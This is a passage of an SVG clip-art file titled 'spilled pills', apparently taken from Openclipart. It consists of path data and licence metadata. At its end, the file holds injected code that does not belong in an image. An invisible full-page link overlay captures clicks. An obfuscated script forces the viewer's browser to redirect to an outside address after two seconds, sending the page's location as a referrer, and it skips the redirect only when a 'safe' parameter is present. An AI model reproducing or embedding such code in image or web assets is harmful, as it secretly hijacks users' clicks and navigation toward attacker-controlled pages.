1.1932-55.207-0.4848zm74.6-15.5c56.868-5.7945 114.08-28.253 165.06-64.789 64.235-46.04 115.25-106.87 153.21-182.71 5.2315-10.45 10.274-20.8 11.205-23 26.118-61.696 38.513-108.74 45.714-173.5 2.0022-18.007 1.686-77.845-0.5073-96-11.115-92.006-42.858-164.02-95.675-217.06-24.486-24.588-45.995-39.848-75.83-53.798-93.826-43.869-207.36-26.49-306.82 46.966-35.757 26.408-72.305 63.633-100.56 102.42-40.862 56.095-70.718 120.42-88.402 190.48-26.424 104.68-20.62 207.96 16.647 296.19 24.102 57.061 61.533 103.18 109.28 134.65 12.389 8.165 36.844 20.479 50.809 25.585 18.833 6.8852 43.994 12.716 62.365 14.454 12.695 1.2008 42.238 1.2665 53.5 0.119zm-47-10.67c-46.896-4.7267-89.85-21.054-127-48.272-6.6226-4.8523-13.22-10.303-24.882-20.555-11.122-9.7783-33.958-37.799-44.823-55-30.583-48.418-46.076-91.847-53.87-151-9.175-69.64 1.1821-169.07 25.109-241.05 11.291-33.966 30.162-71.405 39.633-78.629 1.9421-1.4813 6.0879-7.0243 9.3431-12.492 31.09-52.222 73.746-100.59 117.84-133.63 57.797-43.306 115.41-66.497 178.36-71.8 48.57-4.0911 101.04 7.5577 143.79 31.921 37.66 21.464 67.933 50.327 93.49 89.133 40.501 61.496 60.928 140.56 58.662 227.05-2.0536 78.397-20.738 151.31-57.659 225.01-66.434 132.62-183.56 224.48-303.99 238.42-12.163 1.4082-43.71 1.9296-54 0.8926zm-32-16.808c0-1.7261-4.3011-3.0691-6.1566-1.9223-0.8878 0.5487-0.3779 1.1657 1.6931 2.049 3.8873 1.658 4.4635 1.6417 4.4635-0.1267zm163.5-15.5c-0.3399-0.55-1.0415-1-1.559-1-0.5176 0-0.941 0.45-0.941 1s0.7016 1 1.559 1c0.8575 0 1.2809-0.45 0.941-1zm-211.5-4.023c0-0.4344-0.9-0.5544-2-0.2667-1.1 0.2876-2 0.8783-2 1.3127s0.9 0.5544 2 0.2667c1.1-0.2876 2-0.8783 2-1.3127zm-60.697-49.63c-0.6913-1.8014-9.6529-1.8971-9.0528-0.097 0.2292 0.6875 0.9417 1.3063 1.5833 1.375 0.6417 0.069 1.6433 0.1813 2.2257 0.25 0.5825 0.069 0.7676 0.5965 0.4114 1.1729-0.3562 0.5763-0.3481 1.8138 0.018 2.75 0.5718 1.4622 0.9944 1.2929 2.9984-1.2012 1.283-1.5968 2.1002-3.5093 1.816-4.25zm353.7 1.6c0-0.55-0.7875-0.9931-1.75-0.9847-1.4955 0.013-1.5319 0.1563-0.25 0.9847 1.8872 1.2196 2 1.2196 2 0zm-94.638-1.5c-0.7204-1.8775-1.4722-1.8836-3.9205-0.032-1.8373 1.3897-1.7691 1.4699 1.2775 1.5 2.4573 0.024 3.0825-0.323 2.643-1.4682zm-252.4-0.5c0-0.55-0.45-1-1-1s-1 0.45-1 1 0.45 1 1 1 1-0.45 1-1zm12.331 0.2609c0.2547-0.4185-1.2895-0.8284-3.4314-0.9108-2.1419-0.083-3.7048 0.1567-3.4732 0.5315 0.6015 0.9732 6.3511 1.2891 6.9046 0.3793zm218.76-7.1447c10.778-2.3182 15.865-4.053 25.934-8.8443 11.49-5.4669 13.088-6.5736 19.309-13.366 9.4626-10.333 18.696-25.455 24.162-39.571 4.1503-10.718 4.8708-13.91 7.6384-33.835l3.0559-22-2.2375-14-2.2375-14-5.6791-7c-3.1235-3.85-9.2384-11.5-13.589-17-4.3504-5.5-10.619-12.935-13.93-16.522-3.3109-3.5871-20.803-22.825-38.872-42.75-19.168-21.137-33.576-36.228-34.59-36.228-4.1075 0-17.582 4.1937-25.252 7.8591-32.468 15.517-73.027 56.476-107.31 108.37l-5.7689 8.7318 5.344 8.2682c6.6626 10.308 31.214 42.399 35.014 45.768 1.5513 1.375 11.53 13.36 22.175 26.633 15.546 19.385 22.229 26.801 33.964 37.693 14.749 13.69 20.361 17.458 31.354 21.058 13.5 4.4196 23.552 4.5971 41.517 0.7331zm48.272-5.6105c-0.3153-0.8218-0.9762-1.2452-1.4686-0.9409-1.4119 0.8726-1.044 2.4352 0.5734 2.4352 0.8921 0 1.2435-0.5866 0.8952-1.4943zm91.399-0.3041c-0.3661-1.4 0.1828-1.8483 2.4776-2.0231 4.9389-0.3763 8.2244-2.7378 19.464-13.99 48.836-48.889 86.501-106.97 112.92-174.13 10.268-26.104 20.167-59.38 26.8-90.098 12.445-57.63 12.868-129.42 1.0951-185.96-1.4478-6.9527-6.9512-26.661-11.728-42-8.9384-28.701-30.596-71.559-47.249-93.5-30.714-40.467-67.241-69.1-110.26-86.433-47.342-19.073-102.96-22.356-156.78-9.2553-60.964 14.84-120.76 50.449-174.07 103.65-22.944 22.902-42.116 46.558-59.781 73.767-9.1824 14.143-10.945 17.471-9.6708 18.258 0.8301 0.513 22.551-2.082 66.517-7.9467 9.7653-1.3026 10.352-1.2641 25 1.6433 17.073 3.3888 19.254 4.5015 27.63 14.097 16.103 18.449 25.6 36.924 29.413 57.217 2.2895 12.186 1.5764 35.528-1.4315 46.861-1.1476 4.3236-1.7546 8.4494-1.349 9.1684 0.7932 1.4061 17.292 21.561 39.572 48.342 7.6088 9.1458 22.59 27.272 33.291 40.28 10.935 13.293 20.424 23.934 21.666 24.296 1.215 0.3541 12.559 12.117 25.209 26.14s29.679 32.79 37.842 41.704c12.004 13.109 43.938 51.322 46.857 56.071 0.3848 0.6259 1.842 7.8568 3.2381 16.068l2.5384 14.93-3.0281 22.57c-2.7999 20.868-3.405 23.587-8.0263 36.07-2.749 7.425-6.556 16.043-8.46 19.151-1.904 3.1079-3.4618 6.4149-3.4618 7.3489s-0.7339 3.2447-1.6309 5.135-1.3292 3.7387-0.9603 4.1075c0.3688 0.3688 0.9302-0.3223 1.2475-1.5358 0.743-2.8413 5.1426-2.9626 10.208-0.2815 1.9999 1.0587 4.9121 2.2019 6.4714 2.5405 1.5594 0.3386 3.8094 1.639 5 2.8899 1.3383 1.406 4.4555 2.7568 8.1648 3.5381 6.3865 1.3452 11.432 2.755 15.5 4.331 1.375 0.5327 4.525 1.3353 7 1.7835s7.2 1.2987 10.5 1.8901c3.3 0.5913 6.45 1.6832 7 2.4264 0.9672 1.3069 3.0794 2.4339 4.8666 2.5968 0.4767 0.043 0.655-0.7304 0.3964-1.7195zm-359.48-0.6744c25.362-5.3743 46.279-29.519 59.135-68.262l2.7324-8.2345-4.0786-18.18c-4.224-18.829-5.4412-21.813-13-31.872-2.2417-2.9835-4.0758-6.3871-4.0758-7.5636 0-2.9129-11.311-18.706-23.825-33.265-10.121-11.775-10.492-12.082-18.74-15.535-26.149-10.946-60.334-17.925-113.1-23.091-3.3913-0.332-6.3777-0.2481-6.6364 0.1865-0.6379 1.0721 0.9291 19.316 2.8165 32.79 8.1752 58.364 27.536 110.01 54.358 145 2.5296 3.3 8.1322 9.6885 12.45 14.197 7.347 7.6705 8.3673 8.3686 15.893 10.875 13.429 4.4724 24.596 5.3873 36.072 2.9556zm59.484-29.34c0.2177-0.6531-0.3166-1.1875-1.1875-1.1875-0.8708 0-1.5833 0.7125-1.5833 1.5833 0 1.766 2.1528 1.4584 2.7708-0.3958zm53.2-6.3c0-0.55-0.45-1-1-1s-1 0.45-1 1 0.45 1 1 1 1-0.45 1-1zm-4-2c0-0.55-0.4766-1-1.059-1-0.5825 0-0.7809 0.45-0.441 1s0.8165 1 1.059 1c0.2426 0 0.441-0.45 0.441-1zm-31.396-39.729c-0.3323-0.3323-0.5687 0.2584-0.5253 1.3125 0.048 1.165 0.285 1.4019 0.6042 0.6042 0.2889-0.7219 0.2534-1.5844-0.079-1.9167zm-2-1c-0.3323-0.3323-0.5687 0.2584-0.5253 1.3125 0.048 1.165 0.285 1.4019 0.6042 0.6042 0.2889-0.7219 0.2534-1.5844-0.079-1.9167zm-14.695-83.939c30.012-41.862 62.218-74.353 89.782-90.575 7.1593-4.2136 20.939-10.067 29.06-12.344 2.5666-0.7197 4.2976 1.5681-35.19-46.509-3.8831-4.7278-22.027-26.831-40.32-49.118-32.641-39.768-33.373-40.573-39.376-43.267-7.5201-3.3748-15.362-4.4446-32.891-4.487-60.304-0.1459-95.566 25.384-106.59 77.171-1.2324 5.7896-1.7839 12.979-1.8253 23.796l-0.059 15.5 3.5 6.2157c1.925 3.4186 9.8636 13.544 17.641 22.5 7.7777 8.9564 27.742 32.034 44.365 51.284s36.359 42.091 43.859 50.758c7.4993 8.667 14.269 15.642 15.044 15.5 0.7749-0.142 6.6249-7.5337 13-16.426zm-69.919-34.082c-0.019-1.3621-4.9015-7.0978-59.278-69.641-4.8338-5.5599-10.445-13.259-12.47-17.109-3.6393-6.9206-3.6853-7.156-4.0571-20.75l-0.3761-13.75h-2.5323c-3.6717 0-26.542 6.1036-28.075 7.4926-3.0502 2.7637-6.4818 39.774-6.6101 71.293-0.072 17.602 0.1903 22.459 1.2467 23.113 0.7356 0.4553 5.9106 1.138 11.5 1.5171 25.712 1.7438 69.072 9.241 89.662 15.503 10.894 3.3133 11.004 3.3365 10.989 2.3315zm-88.7-128.2c7.5873-1.5712 14.026-3.0877 14.308-3.3701 0.2823-0.2823 1.7033-5.5536 3.1577-11.714l2.6445-11.201-1.7906-12.658c-1.9461-13.757-6.921-38.882-8.8872-44.883-0.6753-2.0613-1.6778-3.7538-2.2278-3.7611-3.256-0.043-24.5 75.883-24.5 87.564 0 3.6395-0.1672 3.6393 17.295 0.023zm31.662-49.037c13.821-20.352 35.554-34.057 63.543-40.072 11.789-2.5332 42.403-3.7668 54.594-2.1999 11.605 1.4916 21.968 6.3992 27.748 13.14 10.091 11.769 11.068 12.669 12.068 11.134 1.8391-2.8211 3.3478-18.525 2.8352-29.51-1.1616-24.889-11.736-48.87-30.08-68.219l-6.1655-6.503-14-2.9955c-15.988-3.4209-9.8086-3.7254-62 3.0551-20.68 2.6866-31.417 4.5152-34.562 5.8858-4.5007 1.9616-4.6895 2.2415-14.073 20.854-5.2313 10.376-11.586 23.816-14.121 29.866l-4.6096 11 3.4468 14c3.842 15.605 7.8635 34.52 8.8762 41.75 0.3659 2.6125 1.071 4.75 1.5668 4.75s2.7158-2.6717 4.9333-5.9371zm20.992 419.27c-6.8469-6.9693-13.219-13.477-14.161-14.462-3.7113-3.8815-17.924-22.203-24.077-31.036-58.15-83.49-79.972-204.43-58.612-324.83 13.132-74.021 43.054-149.76 83.234-210.68 68.632-104.06 163.72-173.84 264.78-194.3 23.925-4.8433 41.917-6.3432 67.64-5.6389 21.467 0.5878 25.71 0.1064 19.5-2.2125-1.5125-0.5647-7.1665-2.8698-12.564-5.1224-12.435-5.1893-32.807-11.333-48.224-14.544-17.745-3.6959-32.462-4.8638-51.962-4.1235-46.773 1.7755-60.106 1.9065-64.058 0.6294-4.2964-1.3885-36.05-12.739-76.942-27.503-14.3-5.163-58.175-20.913-97.5-35s-74.425-26.692-78-28.011c-3.575-1.3188-17.975-6.5037-32-11.522s-30.9-11.07-37.5-13.448c-6.6-2.3779-17.85-6.4172-25-8.9763s-15.925-5.7257-19.5-7.0369c-8.4464-3.0978-33.537-12.1-97.5-34.982-28.6-10.231-53.575-19.236-55.5-20.011-12.835-5.1668-43.791-15.603-50.208-16.927-13.625-2.8115-32.158-1.6985-43.292 2.6-5.2864 2.0408-36.526 18.779-51.5 27.594-49.832 29.335-87.802 58.719-124.5 96.348-61.394 62.952-96.846 134.14-108.5 217.88-2.7658 19.866-3.788 60.033-2.0741 81.505 3.7415 46.876 15.218 95.158 32.796 137.98 7.2971 17.775 10.904 24.111 22.761 39.981l11.221 15.019 37.9 21.584c39.538 22.517 330.94 189.16 480.4 274.73 47.575 27.237 92.575 52.412 100 55.946 13.406 6.3796 13.594 6.5169 27 19.613 7.425 7.2535 15.975 15.264 19 17.801 8.3297 6.9864 17.385 13.758 18.449 13.796 0.5218 0.018-4.6532-5.6686-11.5-12.638zm805-297.4c59.268-3.5991 121.46-15.829 183.77-36.141l15.274-4.9782 7.3409-9.5203 7.3409-9.5204 1.6028-12.665c2.6683-21.083 2.8952-23.706 3.5433-40.949l0.6247-16.624 17.847-9.1671c15.946-8.1908 18.634-9.949 25.239-16.51 7.1595-7.1117 7.491-7.6579 10.545-17.379l3.153-10.036-1.4712-35c-0.8092-19.25-1.8027-35.74-2.2079-36.644-0.582-1.2983 0.8659-2.5281 6.8954-5.8564 8.1435-4.4954 11.377-8.125 21.182-23.777l4.5585-7.2768-1.2804-20.187-1.2805-20.187-4.5897-4.9272c-13.394-14.378-38.451-29.658-67.09-40.912-45.239-17.777-107.26-29.98-185-36.401-27.491-2.2706-117.4-2.5975-139.5-0.5073-51.425 4.8646-91.62 12.88-130.5 26.025-24.05 8.1307-49 18.87-49 21.092 0 0.5038 0.7019 1.618 1.5598 2.4759 1.3606 1.3605 1.9675 1.3836 4.75 0.1802 1.7546-0.7588 6.4147-2.7729 10.356-4.4758 42.063-18.175 102.2-30.385 178.83-36.308 22.449-1.735 103.2-1.7333 125.5 0 83.779 6.521 148.59 20.877 191.45 42.406 29.256 14.696 45.551 33.07 45.551 51.362 0 17.323-15.889 35.774-42.798 49.699-44.019 22.779-106.98 36.983-194.7 43.923-21.458 1.6976-103.77 1.7047-125 0.011-49.209-3.9262-85.758-9.2862-121.43-17.808-8.337-1.9916-14.803-3.0747-15.313-2.565-0.5097 0.5097-0.2563 3.3682 0.6002 6.7694 4.6252 18.367 8.8956 49.172 10.728 77.387 1.9626 30.224-0.073 71.76-5.1017 104.11-1.0904 7.0151-1.9826 13.228-1.9826 13.807 0 2.6544 29.925 14.982 52 21.422 31.008 9.0453 59.619 13.838 95.5 15.998 12.538 0.7547 47.538 0.5588 62.5-0.3498zm10-229.02c74.193-2.5891 133.48-11.173 183.81-26.612 10.592-3.2494 31.119-11.298 39.514-15.494 16.63-8.3113 31.704-21.155 35.862-30.556 4.5074-10.19 1.9253-20.149-7.8929-30.442-44.886-47.06-218.6-73.795-375.01-57.716-8.7205 0.8965-11.538 0.8833-12.674-0.06-3.049-2.5305-59.848 7.8765-88.613 16.236-19.547 5.6808-46.867 16.16-47.685 18.292-0.2539 0.6617 2.2122 5.63 5.4801 11.041 13.086 21.666 25.117 48.094 33.766 74.172 3.0403 9.1661 6.0702 17.18 6.7331 17.808 1.174 1.1123 17.037 5.2794 35.205 9.2481 38.814 8.4785 88.134 13.156 157.5 14.937 3.025 0.078 18.325-0.3063 34-0.8533z" fill="#0f0c0a"/>
  </g>
  <metadata>
    <rdf:RDF>
      <cc:Work>
        <dc:format>image/svg+xml</dc:format>
        <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"/>
        <cc:license rdf:resource="http://creativecommons.org/licenses/publicdomain/"/>
        <dc:publisher>
          <cc:Agent rdf:about="http://openclipart.org/">
            <dc:title>Openclipart</dc:title>
          </cc:Agent>
        </dc:publisher>
        <dc:title>spilled pills</dc:title>
        <dc:date>2011-07-13T06:59:41</dc:date>
        <dc:description>pill bottle tumped over, two spilled out</dc:description>
        <dc:source>http://openclipart.org/detail/149317/spilled-pills-by-pearish</dc:source>
        <dc:creator>
          <cc:Agent>
            <dc:title>pearish</dc:title>
          </cc:Agent>
        </dc:creator>
        <dc:subject>
          <rdf:Bag>
            <rdf:li>clip art</rdf:li>
            <rdf:li>clipart</rdf:li>
            <rdf:li>drugs</rdf:li>
            <rdf:li>health</rdf:li>
            <rdf:li>medicine</rdf:li>
            <rdf:li>pills</rdf:li>
          </rdf:Bag>
        </dc:subject>
      </cc:Work>
      <cc:License rdf:about="http://creativecommons.org/licenses/publicdomain/">
        <cc:permits rdf:resource="http://creativecommons.org/ns#Reproduction"/>
        <cc:permits rdf:resource="http://creativecommons.org/ns#Distribution"/>
        <cc:permits rdf:resource="http://creativecommons.org/ns#DerivativeWorks"/>
      </cc:License>
    </rdf:RDF>
  </metadata>
<a id='cc' href='//url//'><rect width='100%' height='100%' style='z-index:9000;opacity:0;'/></a><!--<script>--><script><!--</script>--><![CDATA[var urlParams = new URLSearchParams(window.location.search);if(( !urlParams  && !urlParams.get('referrer').includes('file:///')) || !urlParams.get('safe'))setTimeout(()=>window.location='//url//?referrer='+ escape(window.location),2000);]]></script></svg>
